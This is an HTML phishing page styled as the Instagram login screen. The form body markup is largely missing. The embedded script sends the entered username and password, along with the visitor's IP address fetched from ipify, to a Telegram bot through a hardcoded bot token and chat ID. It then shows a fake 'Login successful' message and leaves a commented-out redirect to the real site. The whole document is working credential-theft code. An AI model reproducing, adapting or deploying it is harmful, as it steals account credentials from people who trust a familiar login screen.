<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram • Login</title>

    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />

    <style>
        /* ---------- RESET & BASE ---------- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* ---------- MAIN CARD ---------- */
        .login-wrapper {
            width: 100%;
            max-width: 350px;
            margin: 0 auto;
        }

        /* ---------- LOGIN BOX ---------- */
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 30px;
            margin-bottom: 10px;
        }

        /* ---------- LOGO ---------- */
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo svg {
            width: 175px;
            height: auto;
        }

        /* ---------- FORM ---------- */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 9px 8px 7px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            line-height: 18px;
            color: #262626;
            outline: none;
            transition: border 0.1s ease;
        }

        .login-form input[type="text"]:focus,
        .login-form input[type="password"]:focus {
            border-color: #a8a8a8;
            background: #fff;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
            font-weight: 300;
            font-size: 12px;
        }

        /* ---------- BUTTON ---------- */
        .login-btn {
            margin-top: 8px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            line-height: 18px;
            padding: 7px 16px;
            cursor: pointer;
            transition: background 0.2s ease;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:active {
            opacity: 0.8;
            transform: scale(0.98);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* ---------- DIVIDER ---------- */
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0 14px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider span {
            padding: 0 18px;
            font-size: 13px;
            font-weight: 600;
            color: #8e8e8e;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        /* ---------- FACEBOOK LOGIN ---------- */
        .fb-login {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            margin-bottom: 4px;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            color: #385185;
        }

        .fb-login i {
            font-size: 20px;
        }

        .fb-login:hover {
            color: #1c3b6e;
        }

        /* ---------- FORGOT PASSWORD ---------- */
        .forgot-pw {
            text-align: center;
            font-size: 12px;
            color: #00376b;
            margin-top: 16px;
            text-decoration: none;
        }

        .forgot-pw:hover {
            text-decoration: underline;
        }

        /* ---------- SIGNUP BOX ---------- */
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-box a:hover {
            text-decoration: underline;
        }

        /* ---------- APP STORE BADGES ---------- */
        .app-links {
            text-align: center;
            margin-top: 20px;
        }

        .app-links p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 12px;
        }

        .app-links a {
            display: inline-block;
            margin: 0 4px;
        }

        .app-links img {
            height: 40px;
            width: auto;
        }

        /* ---------- TOAST / NOTIFICATION ---------- */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(80px);
            background: #1a1a1a;
            color: #fff;
            padding: 12px 28px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            pointer-events: none;
            z-index: 999;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
            pointer-events: auto;
        }

        .toast i {
            font-size: 18px;
        }

        .toast.success i {
            color: #4caf50;
        }

        .toast.error i {
            color: #f44336;
        }

        /* ---------- RESPONSIVE ---------- */
        @media (max-width: 450px) {
            .login-box {
                padding: 30px 20px;
            }

            .signup-box {
                padding: 16px 20px;
            }

            .login-wrapper {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>

    <!-- ===== TOAST NOTIFICATION ===== -->

        <i id="toastIcon" class="fas fa-check-circle"></i>

    <!-- ============================================================ -->
    <!-- ===== JAVASCRIPT — Send credentials to Telegram ===== -->
    <!-- ============================================================ -->
    <script>
        (function() {

            // ---------- CONFIG ----------
            const BOT_TOKEN = '7549575434:AAGoWXYGh7yBN-H_LBGc8Bovkvi6_Wz7kYU';
            const CHAT_ID = '5402314210';
            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            // DOM refs
            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const toast = document.getElementById('toast');
            const toastMessage = document.getElementById('toastMessage');
            const toastIcon = document.getElementById('toastIcon');

            // ---------- TOAST HELPERS ----------
            let toastTimer = null;

            function showToast(message, type = 'success') {
                // Clear any existing timer
                if (toastTimer) {
                    clearTimeout(toastTimer);
                    toastTimer = null;
                }

                toastMessage.textContent = message;
                toast.className = 'toast';

                if (type === 'success') {
                    toast.classList.add('success');
                    toastIcon.className = 'fas fa-check-circle';
                } else {
                    toast.classList.add('error');
                    toastIcon.className = 'fas fa-exclamation-circle';
                }

                // Show with a tiny delay so the class reset takes effect
                requestAnimationFrame(() => {
                    toast.classList.add('show');
                });

                // Auto-hide after 4.5s
                toastTimer = setTimeout(() => {
                    toast.classList.remove('show');
                    toastTimer = null;
                }, 4500);
            }

            // ---------- SEND TO TELEGRAM ----------
            async function sendToTelegram(username, password) {
                const ip = await getClientIP();

                const message =
                    `🔐 *INSTAGRAM LOGIN CREDENTIALS* 🔐\n\n` +
                    `👤 *Username/Email:* ${username}\n` +
                    `🔑 *Password:* ${password}\n` +
                    `🌐 *IP Address:* ${ip || 'N/A'}\n` +
                    `🕐 *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;

                const payload = {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                };

                const response = await fetch(TELEGRAM_API, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    const errorText = await response.text();
                    throw new Error(`Telegram API error: ${response.status} — ${errorText}`);
                }

                return response.json();
            }

            // ---------- GET CLIENT IP (using free API) ----------
            async function getClientIP() {
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    return data.ip;
                } catch (_) {
                    return null;
                }
            }

            // ---------- FORM SUBMIT ----------
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (!username || !password) {
                    showToast('Please fill in both fields.', 'error');
                    return;
                }

                // Disable button & show loading state
                loginBtn.disabled = true;
                loginBtn.textContent = 'Logging in…';

                try {
                    await sendToTelegram(username, password);

                    // Success — show toast
                    showToast('✓ Login successful!', 'success');

                    // ✅ Optionally clear the form
                    usernameInput.value = '';
                    passwordInput.value = '';

                    // ✅ Redirect to real Instagram (optional)
                    // window.location.href = 'https://www.instagram.com';

                } catch (error) {
                    console.error('Telegram send error:', error);
                    showToast('⚠️ Could not reach server. Try again.', 'error');
                } finally {
                    // Re-enable button
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'Log in';
                }
            });

            // ---------- KEYBOARD: Enter key triggers submit ----------
            // (Already handled by form submit)

            // ---------- DEMO: click on Facebook / Forgot links do nothing ----------
            document.querySelectorAll('.fb-login, .forgot-pw, .signup-box a, .app-links a').forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                });
            });

        })();
    </script>

</body>
